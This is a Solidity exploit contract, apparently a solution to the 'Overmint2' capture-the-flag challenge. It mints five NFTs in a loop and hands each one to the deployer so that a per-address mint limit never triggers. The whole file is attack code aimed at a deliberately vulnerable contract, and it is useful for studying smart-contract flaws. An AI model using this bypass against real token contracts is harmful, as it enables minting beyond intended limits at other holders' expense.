// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IOvermint2 {
    function mint() external;

    function success() external view returns (bool);

    function totalSupply() external view returns (uint256);
}

contract Overmint2Attacker {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
        attack();
    }

    function attack() public {
        for (uint256 i; i < 5; ) {
            IOvermint2(victim).mint();
            IERC721(victim).safeTransferFrom(address(this), msg.sender, IOvermint2(victim).totalSupply());
            unchecked {
                ++i;
            }
        }
    }
}
